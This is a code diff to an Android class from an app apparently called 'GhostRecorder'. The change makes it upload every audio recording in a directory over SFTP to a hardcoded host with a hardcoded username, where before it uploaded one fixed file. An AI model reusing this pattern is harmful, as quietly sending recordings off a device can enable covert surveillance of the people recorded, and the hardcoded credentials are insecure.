@@ -1,6 +1,7 @@
 package com.byteshaft.ghostrecorder;
 
 
+import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Environment;
 import android.util.Log;
@@ -12,6 +13,7 @@ import com.jcraft.jsch.Session;
 
 import java.io.File;
 import java.io.FileInputStream;
+import java.util.ArrayList;
 
 public class UploadRecordingTask extends AsyncTask<String ,String ,String> {
     private Session session = null;
@@ -19,9 +21,13 @@ public class UploadRecordingTask extends AsyncTask<String ,String ,String> {
     private ChannelSftp channelSftp = null;
     private String mMd5Sum = null;
     RecorderHelpers mRecordingHelpers;
+    Helpers mHelpers;
+    Context mContext;
 
     @Override
     protected String doInBackground(String... params) {
+        mHelpers = new Helpers();
+        mRecordingHelpers = new RecorderHelpers(mContext);
         String SFTPHOST = "192.168.1.2";
         int SFTPPORT = 22;
         String SFTPUSER = "abu";
@@ -42,12 +48,18 @@ public class UploadRecordingTask extends AsyncTask<String ,String ,String> {
             Log.i("Ghost_Recorder", "sftp channel opened and connected.");
             channelSftp = (ChannelSftp) channel;
             channelSftp.cd(SFTPWORKINGDIR);
-            String sdCard = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Recordings/ok.aac";
-            mMd5Sum = mRecordingHelpers.getHashsumForFile(sdCard);
-
-            File f = new File(sdCard);
-            channelSftp.put(new FileInputStream(f), f.getName());
-            Log.i("Ghost_Recorder", "File transfered successfully to host.");
+            if (channelSftp.isConnected()) {
+                ArrayList filesInsideDirectory = mHelpers.getAllFilesFromDir();
+                if (!filesInsideDirectory.isEmpty()) {
+                    for (Object currentFile : filesInsideDirectory) {
+                        mMd5Sum = mRecordingHelpers.getHashsumForFile(currentFile.toString());
+                        File file = new File(mHelpers.path + "/" + currentFile);
+                        Log.i("GhostRecorder", file.toString());
+                        channelSftp.put(new FileInputStream(file), file.getName());
+                        Log.i("Ghost_Recorder", "File transfered successfully to host.");
+                    }
+                }
+            }
         } catch (Exception ex) {
             Log.i("Ghost_Recorder", "Exception found while tranfer the response.");
             ex.printStackTrace();
